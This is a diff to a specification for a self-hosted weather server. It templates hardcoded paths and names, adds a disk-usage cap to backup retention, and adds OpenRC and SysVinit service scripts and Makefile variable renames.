-weather_http_request_duration_seconds_bucket{method="GET",path="/api/v1/users",le="+Inf"} 1523
-weather_http_request_duration_seconds_sum{method="GET",path="/api/v1/users"} 12.456
-weather_http_request_duration_seconds_count{method="GET",path="/api/v1/users"} 1523
+weather_http_request_duration_seconds_bucket{method="GET",path="/api/{api_version}/users",le="0.01"} 1400
+weather_http_request_duration_seconds_bucket{method="GET",path="/api/{api_version}/users",le="0.1"} 1520
+weather_http_request_duration_seconds_bucket{method="GET",path="/api/{api_version}/users",le="+Inf"} 1523
+weather_http_request_duration_seconds_sum{method="GET",path="/api/{api_version}/users"} 12.456
+weather_http_request_duration_seconds_count{method="GET",path="/api/{api_version}/users"} 1523
 
 # HELP weather_db_connections_open Number of open database connections
 # TYPE weather_db_connections_open gauge
@@ -32168,7 +33686,7 @@ groups:
 }
 ```
 
-## Admin Panel (/admin/server/metrics)
+## Admin Panel (/{admin_path}/server/metrics)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -32201,6 +33719,11 @@ weather --maintenance backup [filename]
 | `{config_dir}/theme/` | ✓ If exists | Custom themes |
 | `{config_dir}/ssl/` | Optional | SSL certificates (flag: `--include-ssl`) |
 | `{data_dir}/` | Optional | Data files (flag: `--include-data`) |
+| `{config_dir}/security/pgp.pub.asc` | ✓ Always | Project PGP public key (security reports). Also published to keyservers — see PART 11 → "GPG Keypair Management". |
+| `{config_dir}/security/pgp.priv.asc.enc` | ✓ Always | Project PGP private key (encrypted with `installation_secret`). Required to decrypt in-flight security reports on restore. |
+| `{config_dir}/security/keyservers.state` | ✓ Always | Per-keyserver publish state — prevents double-submit on restore. |
+| Security report rows in `server.db` | ✓ Always | Tracking metadata + encrypted report bodies. See PART 11 → "Security Reports — Coordinated Disclosure Pipeline". |
+| `installation_secret` (in `server.db`) | ✓ Always | Required to derive the PGP private-key KDF AND validate `{security_id}` HMAC continuity across restores. |
 
 ### Admin Credentials in Backup
 
@@ -32309,8 +33832,8 @@ When `server.compliance.enabled: true`:
 | Action | Location | Notes |
 |--------|----------|-------|
 | Set during setup | Setup wizard Step 4 | Optional (unless compliance) |
-| Set later | `/admin/server/backup` | Click "Set Encryption Password" |
-| Change password | `/admin/server/backup` | New backups use new password |
+| Set later | `/{admin_path}/server/backup` | Click "Set Encryption Password" |
+| Change password | `/{admin_path}/server/backup` | New backups use new password |
 | Remove encryption | Only if compliance disabled | Cannot remove if compliance enabled |
 
 **Important:**
@@ -32336,7 +33859,7 @@ weather --maintenance restore backup.tar.gz.enc
 **API Backup with Encryption:**
 
 ```
-POST /api/v1/admin/server/backup
+POST /api/{api_version}/{admin_path}/server/backup
 Content-Type: application/json
 
 {
@@ -32361,7 +33884,7 @@ Content-Type: application/json
 
 Shown on:
 - First backup if encryption not configured
-- `/admin/server/backup` page (dismissable)
+- `/{admin_path}/server/backup` page (dismissable)
 
 ### Backup Retention
 
@@ -32373,6 +33896,7 @@ Shown on:
 | `keep_weekly` | 0 | ≥0 | Weekly backups (Sunday) - 0 = disabled |
 | `keep_monthly` | 0 | ≥0 | Monthly backups (1st) - 0 = disabled |
 | `keep_yearly` | 0 | ≥0 | Yearly backups (Jan 1st) - 0 = disabled |
+| `max_disk_usage_percent` | 5 | 1-50 | Maximum percentage of `{backup_dir}` filesystem capacity that backup files may occupy. Once exceeded, the retention sweep prunes oldest-first across tiers (see "Disk-Usage Cap" below). Acts as a ceiling alongside the count-based retention above. |
 
 **Falsey Values (all disabled):** `0`, `false`, `no`, `none`, `disable`, `disabled`, `off`
 
@@ -32382,11 +33906,24 @@ Shown on:
 server:
   backup:
     retention:
-      max_backups: 1     # 1-365: daily full backups
-      keep_weekly: 0     # 0-52: Sunday backups (0 = disabled)
-      keep_monthly: 0    # 0-12: 1st of month (0 = disabled)
-      keep_yearly: 0     # 0-10: January 1st (0 = disabled)
+      max_backups: 1                  # 1-365: daily full backups
+      keep_weekly: 0                  # 0-52: Sunday backups (0 = disabled)
+      keep_monthly: 0                 # 0-12: 1st of month (0 = disabled)
+      keep_yearly: 0                  # 0-10: January 1st (0 = disabled)
+      max_disk_usage_percent: 5       # 1-50: hard cap on total backup-dir disk usage
 ```
+
+### Disk-Usage Cap
+
+Count-based retention can run away on big datasets — 30 daily backups × 5GB each = 150GB. The disk-usage cap is a belt-and-suspenders ceiling: after the count-based sweep, if total backup-dir usage still exceeds the configured percentage of the underlying filesystem's total capacity, prune additional oldest-first until under the cap.
+
+| Aspect | Behavior |
+|--------|----------|
+| Capacity source | `{backup_dir}`'s filesystem total bytes — `statvfs` on Unix, `GetDiskFreeSpaceEx` on Windows. NOT free bytes — total — so the cap is stable across other apps consuming the disk. |
+| Prune order | Oldest-first across all tiers (daily → weekly → monthly → yearly). The newest of each tier is preserved as long as possible. |
+| Hard floor | The most recent successfully-verified full backup is **never** deleted, even if it alone exceeds the cap. The cap is preventative, not destructive — losing the only working backup to enforce a ceiling would defeat the purpose. |
+| Single-file overrun | If a single backup file is larger than the entire cap (e.g., 6% of disk on a 5% setting), it is kept (per the hard floor) but the backup admin page surfaces a warning: "single backup exceeds cap — consider larger disk, lower frequency, or excluding `--include-data`." |
+| Disabled | Set to `0` (or any falsey value) to disable the cap entirely. Count-based retention still runs. |
 
 **Default: 2 files total** (yesterday's full + today's incremental)
 
@@ -32402,7 +33939,8 @@ server:
 3. Create daily incremental: weather-daily.tar.gz[.enc]
 4. Verify daily incremental (all checks must pass)
 5. If ALL verifications pass:
-   - Apply retention policy (delete old backups per retention settings)
+   - Apply count-based retention (delete old backups per max_backups / keep_weekly / keep_monthly / keep_yearly)
+   - Apply disk-usage cap: if total backup-dir usage > max_disk_usage_percent, prune oldest-first across tiers until under cap (preserving the most recent verified full backup as a hard floor)
 6. If ANY verification fails:
    - Delete failed backup file
    - Keep existing valid backups
@@ -32443,10 +33981,12 @@ Every backup is verified **immediately after creation** - backups must be 100% w
 │  Weekly backups (keep_weekly):        [0    ] ← 0 = disabled        │
 │  Monthly backups (keep_monthly):      [0    ] ← 0 = disabled        │
 │  Yearly backups (keep_yearly):        [0    ] ← 0 = disabled        │
+│  Disk usage cap (% of fs):            [5    ] ← 1-50 (0 = off)      │
 │                                                                      │
 │  [✓] Auto-delete old backups after successful backup                │
 │                                                                      │
-│  Current storage: 23 MB (2 files: yesterday + daily incremental)    │
+│  Current storage: 23 MB / 4.6 GB cap (0.4% of 92 GB filesystem)     │
+│  ████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  10%    │
 │                                                                      │
 │  Hourly incremental:                                                 │
 │  [ ] Enable backup_hourly task (creates 3rd file)                   │
@@ -32454,14 +33994,7 @@ Every backup is verified **immediately after creation** - backups must be 100% w
 └─────────────────────────────────────────────────────────────────────┘
 ```
 
-**Audit Events:**
-
-| Event | Description | Logged Data |
-|-------|-------------|-------------|
-| `backup.created` | Backup created and verified | Filename, size, encrypted, verification status |
-| `backup.retention_cleanup` | Old backups deleted | Deleted files, reason, remaining count |
-| `backup.verification_failed` | Backup verification failed | Filename, check that failed |
-| `backup.daily_updated` | Daily incremental updated | Filename, changes since last |
+**Audit Events:** see PART 11 → "Audit Log Events" for the canonical taxonomy. Backup-related events: `backup.created`, `backup.restored`, `backup.deleted`, `backup.failed`, `backup.retention_cleanup`, `backup.retention_pruned_disk`, `backup.disk_cap_overrun`, `backup.verification_failed`, `backup.daily_updated`.
 
 ### Backup Files Created (Single Task at 02:00)
 
@@ -32497,6 +34030,7 @@ server:
 | `keep_weekly` | 0 | ≥0 | Weekly backups (Sunday) - 0 = disabled |
 | `keep_monthly` | 0 | ≥0 | Monthly backups (1st) - 0 = disabled |
 | `keep_yearly` | 0 | ≥0 | Yearly backups (Jan 1st) - 0 = disabled |
+| `max_disk_usage_percent` | 5 | 1-50 | Maximum percentage of `{backup_dir}` filesystem capacity that backup files may occupy. Once exceeded, the retention sweep prunes oldest-first across tiers (see "Disk-Usage Cap" below). Acts as a ceiling alongside the count-based retention above. |
 
 **Falsey Values (all mean disabled):**
 - `0`, `false`, `no`, `none`, `disable`, `disabled`, `off`
@@ -32711,14 +34245,14 @@ weather --maintenance restore backup_2025-01-15.tar.gz
 
 ```bash
 # Encrypted backup - password required
-POST /api/v1/admin/server/backup/restore
+POST /api/{api_version}/{admin_path}/server/backup/restore
 {
   "backup_file": "backup_2025-01-15.tar.gz.enc",
   "password": "backup-encryption-password"
 }
 
 # Unencrypted backup - no password
-POST /api/v1/admin/server/backup/restore
+POST /api/{api_version}/{admin_path}/server/backup/restore
 {
   "backup_file": "backup_2025-01-15.tar.gz"
 }
@@ -32758,7 +34292,7 @@ POST /api/v1/admin/server/backup/restore
 ├─────────────────────────────────────────────────────────────┤
 │  Setup Token: a1b2c3d4e5f67890abcdef1234567890              │
 │                                                             │
-│  Go to {proto}://wthr.top/admin and enter this token   │
+│  Go to {proto}://{fqdn}/{admin_path} and enter this token   │
 │  to verify you are the server administrator.                │
 │                                                             │
 │  Your existing password and settings will be preserved.     │
@@ -32847,7 +34381,7 @@ weather --maintenance setup
 # │  Setup Token: a1b2c3d4e5f67890abcdef1234567890              │
 # │                                                             │
 # │  1. Start the service: weather --service start        │
-# │  2. Go to: {proto}://wthr.top/admin                    │
+# │  2. Go to: {proto}://{fqdn}/{admin_path}                    │
 # │  3. Enter the setup token above                             │
 # │  4. Create new admin account via setup wizard               │
 # │                                                             │
@@ -32878,7 +34412,7 @@ weather --service start
 | Admin locked out of 2FA | ✓ Yes (only if no recovery keys) |
 | User forgot password | ✗ No (use password reset) |
 | User locked out | ✗ No (admin can help via UI) |
-| Routine password change | ✗ No (use /admin/profile) |
+| Routine password change | ✗ No (use /{admin_path}/profile) |
 
 ### Recovery Flow
 
@@ -33141,10 +34675,10 @@ func CheckForUpdate(ctx context.Context, currentVersion, branch string) (*Releas
     var url string
     switch branch {
     case "stable":
-        url = "https://api.github.com/repos/apimgr/weather/releases/latest"
+        url = "https://api.github.com/repos/apimgr/{internal_name}/releases/latest"
     default:
         // For beta/daily, get all releases and filter
-        url = "https://api.github.com/repos/apimgr/weather/releases"
+        url = "https://api.github.com/repos/apimgr/{internal_name}/releases"
     }
 
     req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
@@ -33396,7 +34930,7 @@ func verifyChecksum(filePath, expectedHash string) error {
 
 Application user creation **REQUIRES** privilege escalation. If the user cannot escalate privileges, the application runs as the current user with user-level directories.
 
-**IMPORTANT: See PART 5 "Smart Escalation Logic" (lines ~7728-7763) for the complete escalation flow:**
+**IMPORTANT: See PART 5 → "Privileged Port Binding (<1024)" → "Binary Implementation" for the complete escalation flow:**
 - Binary first checks if already root/admin → skips escalation prompt entirely
 - Only prompts if user CAN actually escalate (is in sudoers/wheel/admin group)
 - Never prompts if user cannot escalate → shows informative error instead
@@ -33532,7 +35066,7 @@ $ weather --maintenance --help
 Maintenance commands:
 
   backup [file]     Create backup of all data
-                    Default: {backup_dir}/weather-{timestamp}.tar.gz
+                    Default: {backup_dir}/weather-{time_stamp}.tar.gz
 
   restore <file>    Restore from backup file
                     Stops server, restores data, restarts server
@@ -33608,7 +35142,7 @@ Examples:
   weather --update branch beta
 
 Current:
-  Version:  1.0.0
+  Version:  {project_version}
   Branch:   stable
   Latest:   {latest_version} (if different)
 ```
@@ -33930,7 +35464,7 @@ Examples:
 | UID/GID | **Must match** - same value for both UID and GID |
 | UID/GID Range | **200-899** (safe system range, avoids well-known service IDs) |
 | Shell | `/sbin/nologin` or `/usr/sbin/nologin` |
-| Home | Config directory (`/etc/apimgr/weather`) or data directory (`/var/lib/apimgr/weather`) |
+| Home | Config directory (`/etc/apimgr/{internal_name}`) or data directory (`/var/lib/apimgr/{internal_name}`) |
 | Type | System user (no password, no login) |
 | Gecos | `weather service account` |
 
@@ -34034,7 +35568,7 @@ groupadd --system --gid {id} weather
 
 # Create user with matching UID, same primary group
 useradd --system --uid {id} --gid {id} \
-  --home-dir /etc/apimgr/weather \
+  --home-dir /etc/apimgr/{internal_name} \
   --shell /sbin/nologin \
   --comment "weather service account" \
   weather
@@ -34083,7 +35617,7 @@ dscl . -create /Users/weather UniqueID {id}
 dscl . -create /Users/weather PrimaryGroupID {id}
 dscl . -create /Users/weather UserShell /usr/bin/false
 dscl . -create /Users/weather RealName "weather service account"
-dscl . -create /Users/weather NFSHomeDirectory /usr/local/var/apimgr/weather
+dscl . -create /Users/weather NFSHomeDirectory /usr/local/var/apimgr/{internal_name}
 dscl . -create /Users/weather Password "*"
 
 # Hide user from login window
@@ -34097,7 +35631,7 @@ dscl . -create /Users/weather IsHidden 1
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>apimgr.weather</string>
+    <string>{plist_label}</string>
 
     <key>ProgramArguments</key>
     <array>
@@ -34113,10 +35647,10 @@ dscl . -create /Users/weather IsHidden 1
     <true/>
 
     <key>StandardOutPath</key>
-    <string>/var/log/apimgr/weather/stdout.log</string>
+    <string>/var/log/apimgr/{internal_name}/stdout.log</string>
 
     <key>StandardErrorPath</key>
-    <string>/var/log/apimgr/weather/stderr.log</string>
+    <string>/var/log/apimgr/{internal_name}/stderr.log</string>
 </dict>
 </plist>
 ```
@@ -34126,10 +35660,10 @@ dscl . -create /Users/weather IsHidden 1
 | Directory | Path | Purpose |
 |-----------|------|---------|
 | Binary | `/usr/local/bin/weather` | Executable |
-| Config | `/usr/local/etc/apimgr/weather/` | Configuration files |
-| Data | `/usr/local/var/apimgr/weather/` | Application data |
-| Logs | `/usr/local/var/log/apimgr/weather/` | Log files |
-| launchd plist | `/Library/LaunchDaemons/apimgr.weather.plist` | Service definition |
+| Config | `/usr/local/etc/apimgr/{internal_name}/` | Configuration files |
+| Data | `/usr/local/var/apimgr/{internal_name}/` | Application data |
+| Logs | `/usr/local/var/log/apimgr/{internal_name}/` | Log files |
+| launchd plist | `/Library/LaunchDaemons/{plist_label}.plist` | Service definition |
 
 **Go Implementation (macOS):**
 ```go
@@ -34190,7 +35724,7 @@ func createMacOSServiceUser(name string, id int, homeDir string) error {
 # Create user and group with matching ID
 pw groupadd -n weather -g {id}
 pw useradd -n weather -u {id} -g {id} \
-  -d /var/lib/apimgr/weather \
+  -d /var/lib/apimgr/{internal_name} \
   -s /usr/sbin/nologin \
   -c "weather service account"
 ```
@@ -34212,33 +35746,33 @@ pw useradd -n weather -u {id} -g {id} \
 
 Virtual Service Accounts are automatically managed by Windows, require no password management, and have minimal privileges. They are created automatically when the service is installed.
 
-**Service Account Format:** `NT SERVICE\weather`
+**Service Account Format:** `NT SERVICE\{internal_name}`
 
 ```powershell
 # Create service with Virtual Service Account (automatic)
 New-Service -Name "weather" `
-  -BinaryPathName "C:\Program Files\apimgr\weather\weather.exe" `
+  -BinaryPathName "C:\Program Files\apimgr\{internal_name}\weather.exe" `
   -DisplayName "weather" `
   -Description "weather service" `
   -StartupType Automatic
 
-# Service automatically runs as NT SERVICE\weather
+# Service automatically runs as NT SERVICE\{internal_name}
 # No user creation needed - Windows manages it
 ```
 
 **Directory Permissions:**
 ```powershell
 # Grant Virtual Service Account access to config/data directories
-$acl = Get-Acl "C:\ProgramData\apimgr\weather"
+$acl = Get-Acl "C:\ProgramData\apimgr\{internal_name}"
 $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
-    "NT SERVICE\weather",
+    "NT SERVICE\{internal_name}",
     "FullControl",
     "ContainerInherit,ObjectInherit",
     "None",
     "Allow"
 )
 $acl.SetAccessRule($rule)
-Set-Acl "C:\ProgramData\apimgr\weather" $acl
+Set-Acl "C:\ProgramData\apimgr\{internal_name}" $acl
 ```
 
 **Go Implementation (Windows):**
@@ -34282,17 +35816,17 @@ func installWindowsService() error {
 
 | Directory | Path | Purpose |
 |-----------|------|---------|
-| Binary | `C:\Program Files\apimgr\weather\` | Executable |
-| Config | `C:\ProgramData\apimgr\weather\config\` | Configuration files |
-| Data | `C:\ProgramData\apimgr\weather\data\` | Application data |
-| Logs | `C:\ProgramData\apimgr\weather\logs\` | Log files |
+| Binary | `C:\Program Files\apimgr\{internal_name}\` | Executable |
+| Config | `C:\ProgramData\apimgr\{internal_name}\config\` | Configuration files |
+| Data | `C:\ProgramData\apimgr\{internal_name}\data\` | Application data |
+| Logs | `C:\ProgramData\apimgr\{internal_name}\logs\` | Log files |
 
 ### Home Directory Selection
 
 | Directory | Use When |
 |-----------|----------|
-| Config dir (`/etc/apimgr/weather`) | Default - user needs access to config files |
-| Data dir (`/var/lib/apimgr/weather`) | When data dir contains user-writable content |
+| Config dir (`/etc/apimgr/{internal_name}`) | Default - user needs access to config files |
+| Data dir (`/var/lib/apimgr/{internal_name}`) | When data dir contains user-writable content |
 
 **Note:** Home directory must exist before user creation. Create directories first, then user, then set ownership.
 
@@ -34321,13 +35855,13 @@ func installWindowsService() error {
 ## Service Templates
 
 **Unix: Service starts as root, binary drops to `weather` user after port binding.**
-**Windows: Service runs as Virtual Service Account (`NT SERVICE\weather`).**
+**Windows: Service runs as Virtual Service Account (`NT SERVICE\{internal_name}`).**
 
 This allows any port configuration without service file changes.
 
 ### systemd (Linux)
 
-**Installation path:** `/etc/systemd/system/weather.service`
+**Installation path:** `/etc/systemd/system/{internal_name}.service`
 
 ```ini
 [Unit]
@@ -34348,21 +35882,130 @@ StandardError=journal
 ProtectSystem=strict
 ProtectHome=yes
 PrivateTmp=yes
-ReadWritePaths=/etc/apimgr/weather
-ReadWritePaths=/var/lib/apimgr/weather
-ReadWritePaths=/var/cache/apimgr/weather
-ReadWritePaths=/var/log/apimgr/weather
+ReadWritePaths=/etc/apimgr/{internal_name}
+ReadWritePaths=/var/lib/apimgr/{internal_name}
+ReadWritePaths=/var/cache/apimgr/{internal_name}
+ReadWritePaths=/var/log/apimgr/{internal_name}
 
 [Install]
 WantedBy=multi-user.target
 ```
 
+### OpenRC (Alpine, Gentoo, Devuan)
+
+**Installation path:** `/etc/init.d/{internal_name}` (executable shell script)
+
+```sh
+#!/sbin/openrc-run
+# Service identity comes from {internal_name} so config_dir/data_dir paths stay
+# stable across binary renames (see PART 0 → "Why `{internal_name}` exists separately from `weather`").
+
+name="{internal_name}"
+description="{app_name}"
+command="/usr/local/bin/weather"   # actual binary (may differ from {internal_name} after rename)
+command_args=""
+command_user="{internal_name}:{internal_name}"
+pidfile="/var/run/apimgr/{internal_name}.pid"
+command_background=true
+output_log="/var/log/apimgr/{internal_name}/server.log"
+error_log="/var/log/apimgr/{internal_name}/error.log"
+
+depend() {
+    need net
+    after firewall
+    use dns logger
+}
+
+start_pre() {
+    checkpath -d -m 0755 -o {internal_name}:{internal_name} /var/run/apimgr
+    checkpath -d -m 0755 -o {internal_name}:{internal_name} /var/log/apimgr/{internal_name}
+}
+```
+
+**Commands:**
+```bash
+# Enable at boot
+sudo rc-update add {internal_name} default
+
+# Start / stop / restart / status
+sudo rc-service {internal_name} start
+sudo rc-service {internal_name} stop
+sudo rc-service {internal_name} restart
+sudo rc-service {internal_name} status
+
+# Disable at boot
+sudo rc-update del {internal_name} default
+```
+
+### SysVinit (legacy Linux, init.d)
+
+**Installation path:** `/etc/init.d/{internal_name}` (executable shell script — same path as OpenRC; only one of the two is installed per host based on detection)
+
+**Detection:** the binary picks SysVinit only when `/sbin/openrc-run` is absent, `systemctl` is absent, and `/etc/init.d/` exists with a working `update-rc.d` or `chkconfig`.
+
+```sh
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          {internal_name}
+# Required-Start:    $network $remote_fs $syslog
+# Required-Stop:     $network $remote_fs $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: {app_name}
+# Description:       {app_name} daemon
+### END INIT INFO
+
+NAME={internal_name}
+DAEMON=/usr/local/bin/weather
+PIDFILE=/var/run/apimgr/{internal_name}.pid
+USER={internal_name}
+LOGFILE=/var/log/apimgr/{internal_name}/server.log
+
+. /lib/lsb/init-functions
+
+start() {
+    log_daemon_msg "Starting $NAME"
+    start-stop-daemon --start --quiet --background --make-pidfile \
+        --pidfile $PIDFILE --chuid $USER:$USER --exec $DAEMON \
+        -- >> $LOGFILE 2>&1
+    log_end_msg $?
+}
+
+stop() {
+    log_daemon_msg "Stopping $NAME"
+    start-stop-daemon --stop --quiet --pidfile $PIDFILE --retry 10
+    rm -f $PIDFILE
+    log_end_msg $?
+}
+
+case "$1" in
+    start)   start ;;
+    stop)    stop ;;
+    restart) stop; start ;;
+    status)  status_of_proc -p $PIDFILE $DAEMON $NAME && exit 0 || exit $? ;;
+    *)       echo "Usage: $0 {start|stop|restart|status}"; exit 1 ;;
+esac
+exit 0
+```
+
+**Enable at boot:**
+```bash
+# Debian/Ubuntu
+sudo update-rc.d {internal_name} defaults
+
+# RHEL/CentOS
+sudo chkconfig --add {internal_name}
+sudo chkconfig {internal_name} on
+```
+
+**Note:** SysVinit and OpenRC both install to `/etc/init.d/{internal_name}`. The two scripts have completely different syntax; the binary detects which one is in use and writes the matching script. Never attempt to install both on the same host.
+
 ### runit (Linux)
 
-**Installation path:** `/etc/sv/weather/`
+**Installation path:** `/etc/sv/{internal_name}/`
 
 ```
-/etc/sv/weather/
+/etc/sv/{internal_name}/
 ├── run           # Main service script
 ├── log/
 │   └── run       # Logging script
@@ -34378,25 +36021,25 @@ exec /usr/local/bin/weather 2>&1
 **log/run script:**
 ```bash
 #!/bin/sh
-exec svlogd -tt /var/log/apimgr/weather
+exec svlogd -tt /var/log/apimgr/{internal_name}
 ```
 
 ### rc.d (FreeBSD)
 
-**Installation path:** `/usr/local/etc/rc.d/weather`
+**Installation path:** `/usr/local/etc/rc.d/{internal_name}`
 
 ```bash
 #!/bin/sh
 
-# PROVIDE: weather
+# PROVIDE: {internal_name}
 # REQUIRE: NETWORKING
 # KEYWORD: shutdown
 
 . /etc/rc.subr
 
-name="weather"
-rcvar="weather_enable"
-command="/usr/local/bin/weather"
+name="{internal_name}"
+rcvar="{internal_name}_enable"
+command="/usr/local/bin/weather"   # actual binary name (may differ from {internal_name} after a rename)
 
 load_rc_config $name
 run_rc_command "$1"
@@ -34404,7 +36047,7 @@ run_rc_command "$1"
 
 ### launchd (macOS)
 
-**Installation path:** `/Library/LaunchDaemons/apimgr.weather.plist`
+**Installation path:** `/Library/LaunchDaemons/{plist_label}.plist` — see PART 0 → `{plist_label}` for the derivation rule (reverse of `https://wthr.top` → reverse of `https://github.com/apimgr/weather` host → `local.apimgr.{internal_name}` fallback). Examples: `com.acme.jokes`, `io.github.acme.jokes`.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -34412,7 +36055,7 @@ run_rc_command "$1"
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>apimgr.weather</string>
+    <string>{plist_label}</string>
     <key>ProgramArguments</key>
     <array>
         <string>/usr/local/bin/weather</string>
@@ -34422,9 +36065,9 @@ run_rc_command "$1"
     <key>KeepAlive</key>
     <true/>
     <key>StandardOutPath</key>
-    <string>/var/log/apimgr/weather/stdout.log</string>
+    <string>/var/log/apimgr/{internal_name}/stdout.log</string>
     <key>StandardErrorPath</key>
-    <string>/var/log/apimgr/weather/stderr.log</string>
+    <string>/var/log/apimgr/{internal_name}/stderr.log</string>
 </dict>
 </plist>
 ```
@@ -34432,13 +36075,13 @@ run_rc_command "$1"
 **Commands:**
 ```bash
 # Load and start service
-sudo launchctl load /Library/LaunchDaemons/apimgr.weather.plist
+sudo launchctl load /Library/LaunchDaemons/{plist_label}.plist
 
 # Unload service
-sudo launchctl unload /Library/LaunchDaemons/apimgr.weather.plist
+sudo launchctl unload /Library/LaunchDaemons/{plist_label}.plist
 
 # Check status
-sudo launchctl list | grep weather
+sudo launchctl list | grep {internal_name}
 ```
 
 ### Windows Service
@@ -34447,7 +36090,7 @@ sudo launchctl list | grep weather
 
 | Account | Description |
 |---------|-------------|
-| `NT SERVICE\weather` | Virtual Service Account - auto-managed by Windows |
+| `NT SERVICE\{internal_name}` | Virtual Service Account - auto-managed by Windows |
 
 Use `golang.org/x/sys/windows/svc` for Windows service integration:
 
@@ -34515,7 +36158,7 @@ func (ws *windowsService) Execute(args []string, r <-chan svc.ChangeRequest, s c
 - Used to embed default `--server` URL in CLI/Agent binaries
 - If not present, CLI/Agent users must always specify `--server` flag
 - Sources checked in order:
-  1. Environment variable: `OFFICIALSITE=https://example.com`
+  1. Environment variable: `OFFICIAL_SITE=https://example.com`
   2. File: `site.txt` in project root
   3. CI/CD secrets (repository secrets)
   4. Empty (self-hosted projects)
@@ -34664,9 +36307,9 @@ binaries/
 ## Makefile Implementation
 
 ```makefile
-# Infer PROJECTNAME and PROJECTORG from git remote or directory path (NEVER hardcode)
-PROJECTNAME := $(shell git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$$|\1|' || basename "$$(pwd)")
-PROJECTORG := $(shell git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$$|\1|' || basename "$$(dirname "$$(pwd)")")
+# Infer PROJECT_NAME and PROJECT_ORG from git remote or directory path (NEVER hardcode)
+PROJECT_NAME := $(shell git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$$|\1|' || basename "$$(pwd)")
+PROJECT_ORG := $(shell git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$$|\1|' || basename "$$(dirname "$$(pwd)")")
 
 # Version: env var > release.txt > default
 VERSION ?= $(shell cat release.txt 2>/dev/null || echo "0.1.0")
@@ -34679,18 +36322,18 @@ COMMIT_ID := $(shell git rev-parse --short HEAD 2>/dev/null || echo "unknown")
 
 # Official site URL (OPTIONAL - never guess or assume)
 # Sources (in order of precedence):
-#   1. Environment variable: OFFICIALSITE=https://example.com
+#   1. Environment variable: OFFICIAL_SITE=https://example.com
 #   2. File: site.txt in project root (single line, URL only)
 #   3. Empty (self-hosted projects - users must use --server flag)
 # NEVER infer from project name, domain, or any other source
-OFFICIALSITE ?= $(shell [ -f site.txt ] && cat site.txt || echo "")
+OFFICIAL_SITE ?= $(shell [ -f site.txt ] && cat site.txt || echo "")
 
 # Linker flags to embed build info
 LDFLAGS := -s -w \
 	-X 'main.Version=$(VERSION)' \
 	-X 'main.CommitID=$(COMMIT_ID)' \
 	-X 'main.BuildDate=$(BUILD_DATE)' \
-	-X 'main.OfficialSite=$(OFFICIALSITE)'
+	-X 'main.OfficialSite=$(OFFICIAL_SITE)'
 
 # Directories
 BINDIR := binaries
@@ -34704,7 +36347,7 @@ GOCACHE := $(HOME)/.local/share/go/build
 PLATFORMS := linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64 freebsd/amd64 freebsd/arm64
 
 # Docker - Set REGISTRY based on your platform (ghcr.io, registry.gitlab.com, git.example.com)
-REGISTRY ?= ghcr.io/$(PROJECTORG)/$(PROJECTNAME)
+REGISTRY ?= ghcr.io/$(PROJECT_ORG)/$(PROJECT_NAME)
 GO_DOCKER := docker run --rm \
 	-v $(PWD):/build \
 	-v $(GOCACHE):/root/.cache/go-build \
@@ -34731,13 +36374,13 @@ build: clean
 	# Build for local OS/ARCH
 	@echo "Building local binary..."
 	@$(GO_DOCKER) sh -c "GOOS=$$(go env GOOS) GOARCH=$$(go env GOARCH) \
-		go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECTNAME) ./src"
+		go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECT_NAME) ./src"
 
 	# Build server for all platforms
 	@for platform in $(PLATFORMS); do \
 		OS=$${platform%/*}; \
 		ARCH=$${platform#*/}; \
-		OUTPUT=$(BINDIR)/$(PROJECTNAME)-$$OS-$$ARCH; \
+		OUTPUT=$(BINDIR)/$(PROJECT_NAME)-$$OS-$$ARCH; \
 		[ "$$OS" = "windows" ] && OUTPUT=$$OUTPUT.exe; \
 		echo "Building server $$OS/$$ARCH..."; \
 		$(GO_DOCKER) sh -c "GOOS=$$OS GOARCH=$$ARCH \
@@ -34750,7 +36393,7 @@ build: clean
 		for platform in $(PLATFORMS); do \
 			OS=$${platform%/*}; \
 			ARCH=$${platform#*/}; \
-			OUTPUT=$(BINDIR)/$(PROJECTNAME)-cli-$$OS-$$ARCH; \
+			OUTPUT=$(BINDIR)/$(PROJECT_NAME)-cli-$$OS-$$ARCH; \
 			[ "$$OS" = "windows" ] && OUTPUT=$$OUTPUT.exe; \
 			echo "Building CLI $$OS/$$ARCH..."; \
 			$(GO_DOCKER) sh -c "GOOS=$$OS GOARCH=$$ARCH \
@@ -34764,7 +36407,7 @@ build: clean
 		for platform in $(PLATFORMS); do \
 			OS=$${platform%/*}; \
 			ARCH=$${platform#*/}; \
-			OUTPUT=$(BINDIR)/$(PROJECTNAME)-agent-$$OS-$$ARCH; \
+			OUTPUT=$(BINDIR)/$(PROJECT_NAME)-agent-$$OS-$$ARCH; \
 			[ "$$OS" = "windows" ] && OUTPUT=$$OUTPUT.exe; \
 			echo "Building agent $$OS/$$ARCH..."; \
 			$(GO_DOCKER) sh -c "GOOS=$$OS GOARCH=$$ARCH \
@@ -34789,22 +36432,22 @@ local: clean
 	@$(GO_DOCKER) go mod download
 
 	# Build server binary
-	@echo "Building $(PROJECTNAME)..."
+	@echo "Building $(PROJECT_NAME)..."
 	@$(GO_DOCKER) sh -c "GOOS=$$(go env GOOS) GOARCH=$$(go env GOARCH) \
-		go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECTNAME) ./src"
+		go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECT_NAME) ./src"
 
 	# Build CLI binary (if exists)
 	@if [ -d "src/client" ]; then \
-		echo "Building $(PROJECTNAME)-cli..."; \
+		echo "Building $(PROJECT_NAME)-cli..."; \
